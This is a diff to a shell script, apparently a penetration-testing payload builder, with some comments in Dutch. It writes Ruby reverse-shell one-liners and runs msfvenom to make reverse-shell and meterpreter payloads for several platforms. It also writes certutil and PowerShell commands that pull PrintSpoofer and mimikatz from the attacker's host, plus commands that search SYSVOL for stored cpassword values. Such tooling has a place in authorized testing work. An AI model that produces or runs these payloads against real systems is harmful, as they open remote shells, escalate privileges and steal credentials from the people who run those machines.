@@ -90,12 +90,6 @@ echo 'ruby -rsocket -e'"'f=TCPSocket.open(\"${IP}\",${PORT}).to_i;exec sprintf(\
 echo 'ruby -rsocket -e'"'exit if fork;c=TCPSocket.new(\"${IP}\",\"${PORT}\");loop{c.gets.chomp!;(exit! if \$_==\"exit\");(\$_=~/cd (.+)/i?(Dir.chdir(\$1)):(IO.popen(\$_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{\$_}\"}"'' >> http/payloads/${BESTAND}_${PORT}.txt
 
 
-powershell -c (new-object System.Net.WebClient).DownloadFile('http://192.168.45.176/tools/PowerSploit.zip','C:\Windows\system32\WindowsPowerShell\v1.0\Modules\PowerSploit.zip')
-
-
-#TODO windows...
-echo "Building some basic reverse tcp shells"
-
 msfvenom -p windows/shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f exe > http/payloads/${BESTAND}_${PORT}.exe
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f elf > http/payloads/${BESTAND}_${PORT}.elf
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=${IP} LPORT=${PORT} -f elf > http/payloads/meterpreter_${PORT}.elf
@@ -107,7 +101,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=${IP} LPORT=${PORT} -f war > http/p
 msfvenom -p cmd/unix/reverse_python LHOST=${IP} LPORT=${PORT} -f raw > http/payloads/${BESTAND}_${PORT}.py
 msfvenom -p cmd/unix/reverse_bash LHOST=${IP} LPORT=${PORT} -f raw > http/payloads/${BESTAND}_${PORT}.sh
 msfvenom -p cmd/unix/reverse_perl LHOST=${IP} LPORT=${PORT} -f raw > http/payloads/${BESTAND}_${PORT}.pl
-msfvenom -p php/meterpreter_reverse_tcp LHOST=${IP} LPORT=${PORT} -f raw > http/payloads/meterpreter_${PORT}.php; 
+msfvenom -p php/meterpreter_reverse_tcp LHOST=${IP} LPORT=${PORT} -f raw > http/payloads/meterpreter_${PORT}.php 
 msfvenom --platform=solaris --payload=solaris/x86/${BESTAND}_reverse_tcp LHOST=${IP} LPORT=${PORT}  -f elf -e x86/shikata_ga_nai -b '\x00' > http/payloads/solaris_${PORT}.elf
 
 
@@ -116,7 +110,7 @@ echo '#POWERSHELL' >> http/payloads/${BESTAND}_${PORT}.txt
 echo '[powershellplaceholder]' >> http/payloads/${BESTAND}_${PORT}.txt
 python3 powershell.py ${IP} ${PORT} ${BESTAND}_${PORT}.txt
 
-#http/commands uitbreiden
+
 echo '#Downloads' >> http/payloads/${BESTAND}_${PORT}.txt
 echo "certutil -urlcache -split -f http://${IP}/tools/PrintSpoofer64.exe print.exe" >> http/payloads/${BESTAND}_${PORT}.txt
 echo "certutil -urlcache -split -f http://${IP}/tools/mimi/mimikatz.exe mimi.exe" >> http/payloads/${BESTAND}_${PORT}.txt
@@ -164,7 +158,7 @@ echo "powershell -c (new-object System.Net.WebClient).DownloadFile('http://${IP}
 #powershell.exe -exec Bypass -C “IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1’);Invoke-AllChecks”
 
 ## cPasswords in sysvol
-echo "findstr /S cpassword %logonserver%\sysvol\*.xml \n findstr /S cpassword $env:logonserver\sysvol\*.xml" > http/commands/cpassword
+echo "findstr /S cpassword %logonserver%\sysvol\*.xml \n findstr /S cpassword \$env:logonserver\sysvol\*.xml" > http/commands/cpassword
 
 
 ## Inveigh
@@ -189,7 +183,7 @@ echo "findstr /S cpassword %logonserver%\sysvol\*.xml \n findstr /S cpassword $e
 #reg add HKLM\SYSTEM\CurrentControlSet\Contro\SecurityProviders\Wdigest /v UseLogonCredential /t Reg_DWORD /d 1 /f
 
 ## Check always install elevated
-echo "reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer \n reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" > http/command/install_elevated
+echo "reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer \n reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" > http/commands/install_elevated
 
 
 
